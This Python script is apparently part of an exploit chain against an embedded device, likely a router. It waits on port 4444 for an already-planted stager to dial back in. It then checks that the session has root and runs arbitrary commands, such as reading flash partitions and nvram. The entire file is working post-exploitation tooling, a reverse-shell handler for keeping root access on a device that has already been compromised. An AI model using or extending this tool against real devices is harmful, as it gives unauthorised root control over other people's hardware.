#!/usr/bin/env python3
"""Re-attach to a stager that is already dialling in, and run commands.

The stager's channel loop reconnects every 5 seconds for as long as the device
stays up, so losing the driver does not lose root -- only a reboot does.  That
matters because the trigger is one-shot: without this, a driver bug costs a
factory reset and a fresh exploit run to get back to the same place.

    python3 attach.py 'cat /proc/mtd' 'nvram get flash_type'
    python3 attach.py -f commands.txt
"""

import argparse
import sys

import channel
from chain import log


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("commands", nargs="*")
    ap.add_argument("-f", "--file", help="read commands from a file, one per line")
    ap.add_argument("--shell-port", type=int, default=4444)
    ap.add_argument("--timeout", type=int, default=300)
    ap.add_argument("--cmd-timeout", type=int, default=120)
    args = ap.parse_args()

    cmds = list(args.commands)
    if args.file:
        with open(args.file) as fh:
            cmds += [ln.rstrip("\n") for ln in fh
                     if ln.strip() and not ln.lstrip().startswith("#")]
    if not cmds:
        ap.error("give at least one command, or -f")

    ch = channel.ShellChannel(args.shell_port)
    log(f"[*] waiting up to {args.timeout}s for the stager to dial in "
        "(it retries every 5s)")
    if not ch.wait(timeout=args.timeout):
        log("[-] nothing dialled in. The device may have rebooted, which ends "
            "the stager -- that costs a factory reset and a fresh run.")
        return 1

    rc, out = ch.run("id", quiet=True)
    log(f"[+] attached: {out}")
    if "uid=0" not in out:
        log("[-] not root")
        return 1

    for cmd in cmds:
        print(f"\n$ {cmd}")
        try:
            rc, out = ch.run(cmd, timeout=args.cmd_timeout, quiet=True)
        except Exception as e:                                   # noqa: BLE001
            rc, out = -1, f"<{type(e).__name__}: {e}>"
        print(out)
        print(f"[rc={rc}]")
    return 0


if __name__ == "__main__":
    sys.exit(main())
